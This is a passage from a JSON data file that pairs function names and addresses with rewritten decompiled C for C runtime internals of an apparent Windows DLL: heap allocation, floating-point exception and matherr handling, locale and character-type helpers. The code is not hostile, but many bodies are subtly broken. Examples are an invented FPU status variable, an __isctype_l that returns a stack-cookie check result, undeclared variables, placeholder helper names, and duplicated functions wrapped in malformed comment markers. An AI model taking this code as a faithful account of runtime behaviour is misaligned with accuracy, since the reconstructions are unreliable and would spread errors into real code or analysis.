local_2c8;\npiVar15 = piVar8;\npp_Var16 = local_2c0;\nlocal_2d0 = *(int *)(p_Var7 + 0x298);\nlocal_2c8 = *(UINT *)(p_Var7 + 0x29c);\ndo {\nif (*(int *)(param_1 + 8) == *piVar15) {\nlocal_2c4 = piVar15;\nif (pp_Var16 != (__acrt_ptd **)0x0) {\n*piVar8 = piVar8[(int)pp_Var16 * 2];\n*(undefined4 *)(p_Var7 + 0x27c) =\n*(undefined4 *)(p_Var7 + (int)pp_Var16 * 8 + 0x27c);\npiVar8[(int)pp_Var16 * 2] = local_2d0;\n*(UINT *)(p_Var7 + (int)pp_Var16 * 8 + 0x27c) = local_2c8;\n}\nbreak;\n}\npp_Var16 = (__acrt_ptd **)((int)pp_Var16 + 1);\niVar13 = *piVar15;\nUVar5 = piVar15[1];\n*piVar15 = local_2d0;\nlocal_2c4 = piVar15 + 2;\npiVar15[1] = local_2c8;\npiVar15 = local_2c4;\nlocal_2d0 = iVar13;\nlocal_2c8 = UVar5;\n} while ((int)pp_Var16 < 5);\nif (pp_Var16 == (__acrt_ptd **)0x5) {\niVar13 = ___acrt_GetStringTypeA\n(local_2c0,1,\n\"\\x01\\x02\\x03\\x04\\x05\\x06\\a\\b\\t\\n\\v\\f\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !\\\"#$%&\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\"\n,0x7f,local_210,*(UINT *)(param_1 + 8),1);\npp_Var16 = local_2c0;\nif (iVar13 == 0) {\n*(__acrt_ptd ***)(p_Var7 + 0x27c) = local_2c0;\n}\nelse {\ndo {\nlocal_210[(int)pp_Var16] = local_210[(int)pp_Var16] & 0x1ff;\npp_Var16 = (__acrt_ptd **)((int)pp_Var16 + 1);\n} while (pp_Var16 < (__acrt_ptd **)0x7f);\niVar13 = _memcmp(local_210,PTR_DAT_1004e1e4,0xfe);\n*(uint *)(p_Var7 + 0x27c) = (uint)(iVar13 == 0);\n}\n*piVar8 = *(int *)(param_1 + 8);\n}\n*(undefined4 *)(param_1 + 0x18) = *(undefined4 *)(p_Var7 + 0x27c);\n}\nelse if (param_2 == 1) {\n*(UINT *)(param_1 + 0x10) = local_2c8;\n}\nelse if (param_2 == 5) {\n*(UINT *)(param_1 + 0x14) = local_2c8;\n}\npcVar6 = (code *)(&PTR_FUN_1003f790)[param_2 * 3];\n(*(code *)PTR__guard_check_icall_1003a2f8)(param_1);\niVar13 = (*pcVar6)();\nif (iVar13 == 0) {\nif (puVar2 != &DAT_1004e2b0) {\npiVar8 = *(int **)(param_1 + 0x28 + param_2 * 0x10);\nLOCK();\niVar13 = *piVar8 + -1;\n*piVar8 = iVar13;\nUNLOCK();\nif (iVar13 == 0) {\nFID_conflict__free(*(void **)(param_1 + 0x28 + param_2 * 0x10));\nFID_conflict__free(*(void **)(param_1 + 0x24 + param_2 * 0x10));\nFID_conflict__free(*(void **)(param_1 + 0xa0 + param_2 * 4));\n*(__acrt_ptd ***)(iVar9 + param_1) = local_2c0;\n*(__acrt_ptd ***)(param_1 + 0xa0 + param_2 * 4) = local_2c0;\n}\n}\n*_Memory = 1;\n*(undefined4 **)(param_1 + 0x28 + param_2 * 0x10) = _Memory;\n}\nelse {\n*(undefined2 **)(iVar9 + param_1) = puVar2;\nFID_conflict__free(*(void **)(param_1 + 0xa0 + param_2 * 4));\n*(undefined4 *)(param_1 + 0xa0 + param_2 * 4) = uVar3;\nFID_conflict__free(_Memory);\n*(undefined4 *)(param_1 + 8) = uVar4;\n}\n}\n}\n}\n___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_10e : undefined2\nLocal Variable: local_110 : undefined2\nLocal Variable: local_210 : undefined1\nLocal Variable: local_2bc : undefined1\nLocal Variable: local_2c0 : undefined4\nLocal Variable: local_2c4 : undefined4\nLocal Variable: local_2c8 : undefined4\nLocal Variable: local_2cc : undefined4\nLocal Variable: local_2d0 : undefined4\nLocal Variable: local_2d4 : undefined4\nLocal Variable: local_2d8 : undefined4\nLocal Variable: local_2dc : undefined4\nLocal Variable: local_2e0 : undefined4\nLocal Variable: local_2e4 : undefined4\nLocal Variable: local_2e8 : undefined4"}
{"Function Name": "FUN_1002b243", "Address": "1002b243", "Source Code": "void FUN_1002b243(void) \n{\n    HANDLE fileHandle; \n    uint fileType; \n    int dataIndex; \n    uint loopCounter = 0; \n    DWORD standardHandle; \n    do {\n        \n        dataIndex = (loopCounter & 0x3f) * 0x30 + (&DAT_10050088)[(int)loopCounter >> 6];\n        \n        \n        if ((*(int *)(dataIndex + 0x18) == -1) || (*(int *)(dataIndex + 0x18) == -2)) {\n            *(undefined *)(dataIndex + 0x28) = 0x81; \n            \n            standardHandle = (loopCounter == 0) ? 0xfffffff6 : (loopCounter == 1) ? 0xfffffff5 : 0xfffffff4;\n            fileHandle = GetStdHandle(standardHandle); \n            \n            fileType = (fileHandle == (HANDLE)0xffffffff || fileHandle == (HANDLE)0x0) ? 0 : GetFileType(fileHandle);\n            if (fileType == 0) { \n                *(byte *)(dataIndex + 0x28) |= 0x40; \n                *(undefined4 *)(dataIndex + 0x18) = 0xfffffffe; \n                \n                if (DAT_10050068 != 0) {\n                    *(undefined4 *)(*(int *)(DAT_10050068 + loopCounter * 4) + 0x10) = 0xfffffffe;\n                }\n            } else { \n                *(HANDLE *)(dataIndex + 0x18) = fileHandle; \n                \n                if ((fileType & 0xff) == 2) {\n                    *(byte *)(dataIndex + 0x28) |= 0x40; \n                } else if ((fileType & 0xff) == 3) {\n                    *(byte *)(dataIndex + 0x28) |= 8; \n                }\n            }\n        } else { \n            *(byte *)(dataIndex + 0x28) |= 0x80; \n        }\n        loopCounter++; \n    } while (loopCounter != 3); \n    return; \n}"}
{"Function Name": "FUN_1002b379", "Address": "1002b379", "Source Code": "ushort __cdecl FUN_1002b379(undefined4 input1, undefined4 input2)\n{\n    \n    return input2._2_2_ & 0x8000;\n}"}
{"Function Name": "__errcode", "Address": "1002b389", "Source Code": "int __cdecl error_code(uint input_value)\n{\n    \n    if ((input_value & 0x20) == 0) {\n        \n        if ((input_value & 8) != 0) {\n            return 1; \n        }\n        \n        if ((input_value & 4) == 0) {\n            \n            return (input_value & 1) == 0 ? (input_value & 2) * 2 : 3;\n        }\n        return 2; \n    }\n    return 5; \n}"}
{"Function Name": "__except1", "Address": "1002b3bd", "Source Code": "void __cdecl __except1(uint exception_code, int error_param, undefined8 error_info, double floating_point_value, uint math_param)\n{\n    bool exception_handled; \n    int error_code;  \n    uint updated_math_param; \n    uint stack_cookie; \n    \n    stack_cookie = DAT_1004e008 ^ (uint)&stack0xfffffff0;\n    updated_math_param = math_param; \n    exception_handled = __handle_exc(exception_code, &floating_point_value, math_param); \n    \n    if (!exception_handled) {\n        \n        __raise_exc_ex(NULL, &math_param, exception_code, error_param, &error_info, &floating_point_value, 0);\n        updated_math_param = math_param; \n    }\n    error_code = __errcode(exception_code); \n    exception_handled = ___acrt_has_user_matherr(); \n    \n    if (exception_handled && error_code != 0) {\n        \n        __umatherr(error_code, error_param, (int)error_info, (int)((ulonglong)error_info >> 0x20), 0, 0, SUB84(floating_point_value, 0), (int)((ulonglong)floating_point_value >> 0x20));\n    } else {\n        \n        __set_errno_from_matherr(error_code);\n        \n        __ctrlfp(updated_math_param, 0xffff);\n    }\n    \n    ___security_check_cookie_4(stack_cookie ^ (uint)&stack0xfffffff0);\n    return; \n}"}
{"Function Name": "__handle_exc", "Address": "1002b48b", "Source Code": "bool __cdecl __handle_exc(uint inputFlags,double *outputValue,uint maskFlags)\n{\n    uint maskedValue; \n    bool conditionMet; \n    float10 tempValue1; \n    float10 tempValue2; \n    int calculationOffset; \n    maskedValue = inputFlags & 0x1f; \n    if (((inputFlags & 8) != 0) && ((maskFlags & 1) != 0)) { \n        FUN_1002bbf0(1); \n        maskedValue = inputFlags & 0x17; \n        goto LAB_1002b648; \n    }\n    if ((inputFlags & maskFlags & 4) != 0) { \n        FUN_1002bbf0(4); \n        maskedValue = inputFlags & 0x1b; \n        goto LAB_1002b648; \n    }\n    if (((inputFlags & 1) == 0) || ((maskFlags & 8) == 0)) { \n        if (((inputFlags & 2) != 0) && ((maskFlags & 0x10) != 0)) { \n            conditionMet = (inputFlags & 0x10) != 0; \n            if (NAN(*outputValue) == (*outputValue == 0.0)) { \n                tempValue1 = (float10)FUN_1002ba50(SUB84(*outputValue,0),(uint)((ulonglong)*outputValue >> 0x20),&calculationOffset); \n                calculationOffset = calculationOffset - 0x600; \n                uint lowerPart = SUB84((double)tempValue1,0); \n                byte higherByte = (byte)((ulonglong)(double)tempValue1 >> 0x20); \n                undefined nextByte = (undefined)((ulonglong)(double)tempValue1 >> 0x28); \n                ushort ushortValue = (ushort)((ulonglong)(double)tempValue1 >> 0x30); \n                if (calculationOffset < -0x432) { \n                    tempValue2 = (float10)0 * tempValue1; \n                    conditionMet = true; \n                } else {\n                    ushortValue = ushortValue & 0xf | 0x10; \n                    if (calculationOffset < -0x3fd) { \n                        int iterationCount = -0x3fd - calculationOffset; \n                        do {\n                            if (((lowerPart & 1) != 0) && (!conditionMet)) { \n                                conditionMet = true; \n                            }\n                            lowerPart = lowerPart >> 1; \n                            if ((higherByte & 1) != 0) { \n                                lowerPart = lowerPart | 0x80000000; \n                            }\n                            uint uVar5 = CONCAT22(ushortValue,CONCAT11(nextByte,higherByte)) >> 1; \n                            higherByte = (byte)uVar5; \n                            nextByte = (undefined)(uVar5 >> 8); \n                            ushortValue = ushortValue >> 1; \n                            iterationCount--; \n                        } while (iterationCount != 0); \n                    }\n                    tempValue2 = (float10)(double)CONCAT26(ushortValue,CONCAT15(nextByte,CONCAT14(higherByte,lowerPart))); \n                    if (tempValue1 < (float10)0) { \n                        tempValue2 = -tempValue2; \n                    }\n                }\n                *outputValue = (double)tempValue2; \n            } else {\n                conditionMet = true; \n            }\n            if (conditionMet) { \n                FUN_1002bbf0(0x10); \n            }\n            maskedValue = inputFlags & 0x1d; \n        }\n        goto LAB_1002b648; \n    }\n    FUN_1002bbf0(8); \n    maskedValue = maskFlags & 0xc00; \n    double globalValue = _DAT_1003ff68; \n    if (maskedValue == 0) { \n        if (0.0 < *outputValue == NAN(*outputValue)) { \n            globalValue = -globalValue; \n        }\n        *outputValue = globalValue; \n    } else {\n        if (maskedValue == 0x400) { \n            globalValue = _DAT_1003ff70; \n            if (0.0 < *outputValue == NAN(*outputValue)) { \n                globalValue = -globalValue; \n            }\n            *outputValue = globalValue; \n        } else if (maskedValue == 0x800 || maskedValue == 0xc00) { \n            globalValue = _DAT_1003ff70; \n            if (0.0 < *outputValue == NAN(*outputValue)) { \n                globalValue = -globalValue; \n            }\n            *outputValue = globalValue; \n        }\n    }\nLAB_1002b648: \n    if (((inputFlags & 0x10) != 0) && ((maskFlags & 0x20) != 0)) { \n        FUN_1002bbf0(0x20); \n        maskedValue = maskedValue & 0xffffffef; \n    }\n    return maskedValue == 0; \n}"}
{"Function Name": "__raise_exc", "Address": "1002b66b", "Source Code": "void __cdecl\n__raise_exc(uint *param_1, uint *param_2, uint param_3, int param_4, undefined8 *param_5,\nundefined8 *param_6)\n{\n    \n    __raise_exc_ex(param_1, param_2, param_3, param_4, param_5, param_6, 0);\n}"}
{"Function Name": "__raise_exc_ex", "Address": "1002b68e", "Source Code": "void __cdecl\n__raise_exc_ex(uint *param_1, uint *param_2, uint param_3, int param_4, undefined8 *param_5,\nundefined8 *param_6, int param_7)\n{\n    uint uVar3;\n    DWORD dwExceptionCode = 0xc000000d; \n    param_1[1] = 0; \n    param_1[2] = 0; \n    param_1[3] = 0; \n    \n    if (param_3 & 0x10) {\n        dwExceptionCode = 0xc000008f; \n        param_1[1] |= 1; \n    }\n    if (param_3 & 2) {\n        dwExceptionCode = 0xc0000093; \n        param_1[1] |= 2; \n    }\n    if (param_3 & 1) {\n        dwExceptionCode = 0xc0000091; \n        param_1[1] |= 4; \n    }\n    if (param_3 & 4) {\n        dwExceptionCode = 0xc000008e; \n        param_1[1] |= 8; \n    }\n    if (param_3 & 8) {\n        dwExceptionCode = 0xc0000090; \n        param_1[1] |= 0x10; \n    }\n    \n    param_1[2] ^= (~(*param_2 << 4) ^ param_1[2]) & 0x10;\n    param_1[2] ^= (~(*param_2 * 2) ^ param_1[2]) & 8;\n    param_1[2] ^= (~(*param_2 >> 1) ^ param_1[2]) & 4;\n    param_1[2] ^= (~(*param_2 >> 3) ^ param_1[2]) & 2;\n    param_1[2] ^= (~(*param_2 >> 5) ^ param_1[2]) & 1;\n    \n    uVar3 = __statfp();\n    if (uVar3 & 1) param_1[3] |= 0x10; \n    if (uVar3 & 4) param_1[3] |= 8; \n    if (uVar3 & 8) param_1[3] |= 4; \n    if (uVar3 & 0x10) param_1[3] |= 2; \n    if (uVar3 & 0x20) param_1[3] |= 1; \n    \n    uVar3 = *param_2 & 0xc00;\n    if (uVar3 == 0) {\n        *param_1 &= 0xfffffffc; \n    } else if (uVar3 == 0x400) {\n        *param_1 = *param_1 & 0xfffffffd | 1; \n    } else if (uVar3 == 0x800) {\n        *param_1 = *param_1 & 0xfffffffe | 2; \n    } else if (uVar3 == 0xc00) {\n        *param_1 |= 3; \n    }\n    \n    uVar3 = *param_2 & 0x300;\n    if (uVar3 == 0) {\n        *param_1 = *param_1 & 0xffffffeb | 8; \n    } else if (uVar3 == 0x200) {\n        *param_1 = *param_1 & 0xffffffe7 | 4; \n    } else if (uVar3 == 0x300) {\n        *param_1 &= 0xffffffe3; \n    }\n    \n    *param_1 ^= (param_4 << 5 ^ *param_1) & 0x1ffe0;\n    param_1[8] |= 1; \n    \n    if (param_7 == 0) {\n        param_1[8] = (param_1[8] & 0xffffffe3) | 2; \n        *(undefined8 *)(param_1 + 4) = *param_5; \n        param_1[0x18] = (param_1[0x18] | 1) & 0xffffffe3 | 2; \n        *(undefined8 *)(param_1 + 0x14) = *param_6; \n    } else {\n        param_1[8] &= 0xffffffe1; \n        param_1[4] = *(uint *)param_5; \n        param_1[0x18] |= 1; \n        param_1[0x18] &= 0xffffffe1; \n        param_1[0x14] = *(uint *)param_6; \n    }\n    __clrfp(); \n    RaiseException(dwExceptionCode, 0, 1, (ULONG_PTR *)&param_1); \n    \n    if (*(byte *)(param_1 + 2) & 0x10) *param_2 &= 0xfffffffe; \n    if (*(byte *)(param_1 + 2) & 8) *param_2 &= 0xfffffffb; \n    if (*(byte *)(param_1 + 2) & 4) *param_2 &= 0xfffffff7; \n    if (*(byte *)(param_1 + 2) & 2) *param_2 &= 0xffffffef; \n    if (*(byte *)(param_1 + 2) & 1) *param_2 &= 0xffffffdf; \n    \n    uVar3 = *param_1 & 3;\n    if (uVar3 == 0) {\n        *param_2 &= 0xfffff3ff; \n    } else if (uVar3 == 1) {\n        *param_2 = *param_2 & 0xfffff7ff | 0x400; \n    } else if (uVar3 == 2) {\n        *param_2 = *param_2 & 0xfffffbff | 0x800; \n    } else if (uVar3 == 3) {\n        *param_2 |= 0xc00; \n    }\n    \n    uVar3 = *param_1 >> 2 & 7;\n    if (uVar3 == 0) {\n        *param_2 = *param_2 & 0xfffff3ff | 0x300; \n    } else if (uVar3 == 1) {\n        *param_2 = *param_2 & 0xfffff3ff | 0x200; \n    } else if (uVar3 == 2) {\n        *param_2 &= 0xfffff3ff; \n    }\n    \n    if (param_7 == 0) {\n        *(undefined8 *)param_6 = *(undefined8 *)(param_1 + 0x14); \n    } else {\n        *(uint *)param_6 = param_1[0x14]; \n    }\n}"}
{"Function Name": "__set_errno_from_matherr", "Address": "1002b97f", "Source Code": "void __cdecl __set_errno_from_matherr(int error_code)\n{\n    \n    undefined4 *error_pointer = (undefined4 *)FUN_100253b8();\n    \n    if (error_code == 1) {\n        \n        *error_pointer = 0x21;\n    } \n    \n    else if (error_code - 2U < 2) {\n        \n        *error_pointer = 0x22;\n    }\n}"}
{"Function Name": "__umatherr", "Address": "1002b9ae", "Source Code": "float10 __cdecl\n__umatherr(int param_1, int param_2, undefined4 param_3, undefined4 param_4, undefined4 param_5,\nundefined4 param_6, undefined4 param_7, undefined4 param_8)\n{\n    double dVar1; \n    int iVar2; \n    undefined *local_20 = (undefined *)0x0; \n    int local_24; \n    \n    for (iVar2 = 0; iVar2 < 0x1d; iVar2++) {\n        \n        if ((&DAT_1003fdb8)[iVar2 * 2] == param_2) {\n            local_20 = (&PTR_DAT_1003fdbc)[iVar2 * 2]; \n            break; \n        }\n    }\n    \n    __ctrlfp(in_stack_00000024, 0xffff);\n    \n    \n    if (local_20 == (undefined *)0x0) {\n        __set_errno_from_matherr(param_1); \n        dVar1 = (double)CONCAT44(param_8, param_7); \n    } else {\n        local_24 = param_1; \n        \n        if (___acrt_invoke_user_matherr(&local_24) == 0) {\n            __set_errno_from_matherr(param_1); \n        }\n        dVar1 = (double)CONCAT44(param_8, param_7); \n    }\n    \n    return (float10)dVar1; \n}"}
{"Function Name": "__set_exp", "Address": "1002bb24", "Source Code": "float10 __cdecl __set_exp(undefined8 param_1, short param_2)\n{\n    \n    return (float10)(double)CONCAT26(\n        \n        \n        (param_2 + 0x3fe) * 0x10 | param_1._6_2_ & 0x800f, \n        \n        (int6)param_1\n    );\n}"}
{"Function Name": "__sptype", "Address": "1002bb53", "Source Code": "undefined4 __cdecl __sptype(int input_value, uint float_representation)\n{\n    \n    if (float_representation == 0x7ff00000) {\n        \n        if (input_value == 0) {\n            return 1; \n        }\n    } \n    \n    else if (float_representation == 0xfff00000 && input_value == 0) {\n        return 2; \n    }\n    \n    \n    if ((float_representation._2_2_ & 0x7ff8) == 0x7ff8) {\n        return 3; \n    } \n    else {\n        \n        if ((float_representation._2_2_ & 0x7ff8) != 0x7ff0 || (float_representation & 0x7ffff) == 0 && input_value == 0) {\n            return 0; \n        }\n        return 4; \n    }\n}"}
{"Function Name": "__clrfp", "Address": "1002bbb1", "Source Code": "int __clrfp(void) \n{\n    return (int)fpu_status_word; \n}"}
{"Function Name": "FUN_1002bbf0", "Address": "1002bbf0", "Source Code": "void FUN_1002bbf0(uint input_value)\n{\n    \n    return;\n}"}
{"Function Name": "__statfp", "Address": "1002bc4b", "Source Code": "int __statfp(void) \n{\n    return (int)fpu_status_word; \n}"}
{"Function Name": "__calloc_base", "Address": "1002bc5d", "Source Code": "LPVOID __cdecl __calloc_base(uint num_elements, uint element_size)\n{\n    LPVOID allocated_memory; \n    size_t total_bytes; \n    \n    if ((num_elements == 0) || (element_size <= 0xffffffe0 / num_elements)) {\n        total_bytes = num_elements * element_size; \n        if (total_bytes == 0) {\n            total_bytes = 1; \n        }\n        do {\n            \n            allocated_memory = HeapAlloc(DAT_10050394, 8, total_bytes);\n            if (allocated_memory != (LPVOID)0x0) {\n                return allocated_memory; \n            }\n        } while (__callnewh(total_bytes) != 0); \n    }\n    *(undefined4 *)FUN_100253b8() = 0xc; \n    return (LPVOID)0x0; \n}"}
{"Function Name": "_iswctype", "Address": "1002bcba", "Source Code": "int __cdecl _iswctype(wint_t inputChar, wctype_t typeMask)\n{\n    uint resultType; \n    BOOL isTypeRetrieved; \n    uint unusedVar; \n    \n    if (inputChar == 0xffff) {\n        resultType = 0; \n    } else {\n        \n        if (inputChar < 0x100) {\n            \n            resultType = (uint)(*(ushort *)(PTR_DAT_1004e11c + (uint)inputChar * 2) & typeMask);\n        } else {\n            resultType = 0; \n            \n            isTypeRetrieved = GetStringTypeW(1, (LPCWSTR)&inputChar, 1, (LPWORD)&resultType);\n            \n            if (isTypeRetrieved != 0) {\n                resultType &= typeMask; \n            }\n        }\n    }\n    return resultType; \n}"}
{"Function Name": "__isctype_l", "Address": "1002bd19", "Source Code": "int __cdecl __isctype_l(int characterCode, int type, _locale_t locale)\n{\n    int returnValue; \n    int localeData; \n    localeinfo_struct localeInfo; \n    CHAR firstPartChar; \n    CHAR secondPartChar; \n    uint stackCookie; \n    \n    stackCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    FUN_1001bfff(&localeData, (__acrt_ptd **)locale);\n    \n    if (0x100 < characterCode + 1U) {\n        \n        returnValue = __isleadbyte_l(characterCode >> 8 & 0xff, &localeInfo);\n        if (returnValue == 0) {\n            \n            returnValue = 1;\n            firstPartChar = (CHAR)characterCode;\n        } else {\n            \n            returnValue = 2;\n            firstPartChar = (CHAR)((uint)characterCode >> 8);\n            secondPartChar = (CHAR)characterCode;\n        }\n        \n        returnValue = ___acrt_GetStringTypeA((__acrt_ptd **)&localeInfo, 1, &firstPartChar, returnValue, NULL,\n                                        (localeInfo.locinfo)->lc_collate_cp, 1);\n        \n        if (returnValue == 0) {\n            goto LAB_1002bddc;\n        }\n    }\nLAB_1002bddc:\n    \n    returnValue = ___security_check_cookie_4(stackCookie ^ (uint)&stack0xfffffffc);\n    return returnValue; \n}"}
{"Function Name": "FUN_1002bebf", "Address": "1002bebf", "Source Code": "SIZE_T __cdecl FUN_1002bebf(LPCVOID input_pointer)\n{\n    \n    if (input_pointer == (LPCVOID)0x0) {\n        \n        *(undefined4 *)get_specific_address() = 0x16;\n        \n        call_another_function();\n        \n        return 0xffffffff;\n    }\n    \n    return HeapSize(heap_handle, 0, input_pointer);\n}"}
{"Function Name": "__realloc_base", "Address": "1002befd", "Source Code": "LPVOID __cdecl __realloc_base(void *input_pointer, uint requested_size)\n{\n    LPVOID reallocated_memory_pointer; \n    \n    if (input_pointer == (void *)0x0) {\n        \n        reallocated_memory_pointer = __malloc_base(requested_size);\n    } else {\n        \n        if (requested_size == 0) {\n            \n            FID_conflict__free(input_pointer);\n            return (LPVOID)0x0; \n        } else if (requested_size < 0xffffffe1) { \n            do {\n                \n                reallocated_memory_pointer = HeapReAlloc(DAT_10050394, 0, input_pointer, requested_size);\n                \n                if (reallocated_memory_pointer != (LPVOID)0x0) {\n                    return reallocated_memory_pointer; \n                }\n            } while (FUN_10031bb1() != 0 && __callnewh(requested_size) != 0); \n        }\n        \n        (void *)FUN_100253b8();\n    }\n    return (LPVOID)0x0; \n}"}
{"Function Name": "FUN_1002bf66", "Address": "1002bf66", "Source Code": "bool isFunctionOneNotEqualToOne(void)\n{\n    \n    return getFunctionReturnValue() != 1;\n}"}
{"Function Name": "FUN_1002bf86", "Address": "1002bf86", "Source Code": "uint __cdecl FUN_1002bf86(uint firstValue, uint secondValue)\n{\n    \n    \n    return (firstValue < secondValue) ? 0xffffffff : \n           \n           (uint)(secondValue < firstValue);\n}"}
{"Function Name": "FUN_1002c17e", "Address": "1002c17e", "Source Code": "int __cdecl FUN_1002c17e(char *inputString, char *processString, uint length, LPCVOID *memoryPointer)\n{\n    char *currentChar = inputString; \n    while (*currentChar != '\\0') { \n        currentChar++; \n    }\n    currentChar += (1 - (int)(inputString + 1)); \n    int resultCode; \n    if ((char *)(-1 - length) < currentChar) { \n        resultCode = 0xc; \n    } else {\n        char *newPointer = currentChar + length + 1; \n        char *allocatedMemory = (char *)__calloc_base((uint)newPointer, 1); \n        \n        if (length != 0) { \n            resultCode = FUN_10035efb(allocatedMemory, (uint)newPointer, processString, length); \n            if (resultCode != 0) goto LAB_1002c225; \n        }\n        \n        resultCode = FUN_10035efb(allocatedMemory + length, (int)newPointer - length, inputString, (uint)currentChar); \n        if (resultCode != 0) { \nLAB_1002c225:\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n        }\n        \n        resultCode = expand_if_necessary(memoryPointer); \n        if (resultCode == 0) { \n            *(char **)memoryPointer[1] = allocatedMemory; \n            memoryPointer[1] = (LPCVOID)((int)memoryPointer[1] + 4); \n        } else {\n            FID_conflict__free(allocatedMemory); \n        }\n        FID_conflict__free((void *)0x0); \n    }\n    return resultCode; \n}"}
{"Function Name": "expand_if_necessary", "Address": "1002c3b6", "Source Code": "undefined4 __fastcall expand_if_necessary(LPCVOID *memory_params)\n{\n    undefined4 return_value; \n    LPVOID allocated_memory;    \n    uint current_allocation_size;       \n    \n    if (memory_params[1] == memory_params[2]) {\n        \n        if (*memory_params == (LPCVOID)0x0) {\n            allocated_memory = __calloc_base(4, 4); \n            *memory_params = allocated_memory; \n            FID_conflict__free((void *)0x0); \n            \n            if (allocated_memory != (LPCVOID)0x0) {\n                memory_params[1] = allocated_memory; \n                memory_params[2] = (LPCVOID)((int)allocated_memory + 0x10); \n                return 0; \n            }\n        } else {\n            \n            current_allocation_size = (int)memory_params[2] - (int)*memory_params >> 2;\n            \n            if (current_allocation_size < 0x80000000) {\n                allocated_memory = __recalloc_base(*memory_params, current_allocation_size * 2, 4); \n                \n                if (allocated_memory == (LPVOID)0x0) {\n                    return 0xc; \n                }\n                *memory_params = allocated_memory; \n                memory_params[1] = (LPVOID)((int)allocated_memory + current_allocation_size * 4); \n                memory_params[2] = (LPVOID)((int)allocated_memory + current_allocation_size * 8); \n                FID_conflict__free((void *)0x0); \n                return 0; \n            }\n        }\n        return 0xc; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_1002c43d", "Address": "1002c43d", "Source Code": "void __cdecl FUN_1002c43d(uchar **inputArray, LPVOID *outputPointer)\n{\n    \n    FUN_1002bf9e(inputArray, outputPointer);\n}"}
{"Function Name": "__acrt_lock_and_call<>", "Address": "1002c48b", "Source Code": "\\*\nvoid __cdecl\n__acrt_lock_and_call<>(undefined4 param_1,<lambda_ae742caa10f662c28703da3d2ea5e57e> *param_2)\n{\n    \n    __crt_seh_guarded_call<void> local_5;\n    \n    __crt_seh_guarded_call<void>::\n    operator()<class_<lambda_ceb1ee4838e85a9d631eb091e2fbe199>,class_<lambda_ae742caa10f662c28703da3d2ea5e57e>&,class_<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37>_>\n    (&local_5, \n    (class_<lambda_ceb1ee4838e85a9d631eb091e2fbe199> *)&param_1, \n    param_2, \n    (class_<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37> *)&param_1); \n    \n    return;\n}\n*\\ \n \nvoid __cdecl\n__acrt_lock_and_call<>(undefined4 param_1,<lambda_ae742caa10f662c28703da3d2ea5e57e> *param_2)\n{\n    __crt_seh_guarded_call<void> local_5;\n    __crt_seh_guarded_call<void>::\n    operator()<class_<lambda_ceb1ee4838e85a9d631eb091e2fbe199>,class_<lambda_ae742caa10f662c28703da3d2ea5e57e>&,class_<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37>_>\n    (&local_5, (class_<lambda_ceb1ee4838e85a9d631eb091e2fbe199> *)&param_1, param_2,\n    (class_<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37> *)&param_1);\n    return;\n}"}
{"Function Name": "CPtoLocaleName", "Address": "1002c536", "Source Code": "\\*\nwchar_t * __cdecl CPtoLocaleName(int code_page) \n{\n    if (code_page == 0x3a4) \n        return (wchar_t *)PTR_u_ja_JP_1003ff98; \n    if (code_page == 0x3a8) \n        return (wchar_t *)PTR_u_zh_CN_1003ff9c; \n    if (code_page == 0x3b5) \n        return (wchar_t *)PTR_u_ko_KR_1003ffa0; \n    if (code_page == 0x3b6) \n        return (wchar_t *)PTR_u_zh_TW_1003ffa4; \n    return (wchar_t *)0x0; \n}\n*\\ \n \nwchar_t * __cdecl CPtoLocaleName(int code_page)\n{\n    if (code_page == 0x3a4) return (wchar_t *)PTR_u_ja_JP_1003ff98;\n    if (code_page == 0x3a8) return (wchar_t *)PTR_u_zh_CN_1003ff9c;\n    if (code_page == 0x3b5) return (wchar_t *)PTR_u_ko_KR_1003ffa0;\n    if (code_page == 0x3b6) return (wchar_t *)PTR_u_zh_TW_1003ffa4;\n    return (wchar_t *)0x0;\n}"}
{"Function Name": "setSBCS", "Address": "1002c5e7", "Source Code": "void __cdecl setSBCS(__crt_multibyte_data *multibyteData)\n{\n    __crt_multibyte_data *offsetPointer;\n    \n    offsetPointer = multibyteData + 0x18;\n    \n    _memset(offsetPointer, 0, 0x101);\n    \n    *(undefined4 *)(multibyteData + 4) = 0;    \n    *(undefined4 *)(multibyteData + 8) = 0;    \n    *(undefined4 *)(multibyteData + 0x21c) = 0; \n    *(undefined4 *)(multibyteData + 0xc) = 0;   \n    *(undefined4 *)(multibyteData + 0x10) = 0;  \n    *(undefined4 *)(multibyteData + 0x14) = 0;  \n    \n    for (int index = 0; index < 0x101; index++) {\n        offsetPointer[index] = offsetPointer[(int)&DAT_1004e5e8 - (int)multibyteData + index];\n    }\n    \n    offsetPointer = multibyteData + 0x119;\n    \n    for (int index = 0; index < 0x100; index++) {\n        offsetPointer[index] = offsetPointer[(int)&DAT_1004e5e8 - (int)multibyteData + index];\n    }\n}"}
{"Function Name": "setSBUpLow", "Address": "1002c64c", "Source Code": "void __cdecl setSBUpLow(__crt_multibyte_data *multibyteData)\n{\n    uint loopIndex; \n    BYTE *leadBytePtr; \n    __crt_multibyte_data *currentMultibyteData; \n    _cpinfo codePageInfo; \n    WORD stringTypeInfo[512]; \n    __crt_multibyte_data mappedMultibyteData1[256]; \n    __crt_multibyte_data mappedMultibyteData2[256]; \n    CHAR characterData[256]; \n    uint stackSecurityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    \n    if (GetCPInfo(*(UINT *)(multibyteData + 4), &codePageInfo) == 0) {\n        for (loopIndex = 0; loopIndex < 0x100; loopIndex++) {\n            characterData[loopIndex] = (CHAR)loopIndex; \n        }\n        leadBytePtr = codePageInfo.LeadByte; \n        characterData[0] = ' '; \n        \n        while (codePageInfo.LeadByte[0] != 0) {\n            for (loopIndex = (uint)codePageInfo.LeadByte[0]; loopIndex <= leadBytePtr[1] && loopIndex < 0x100; 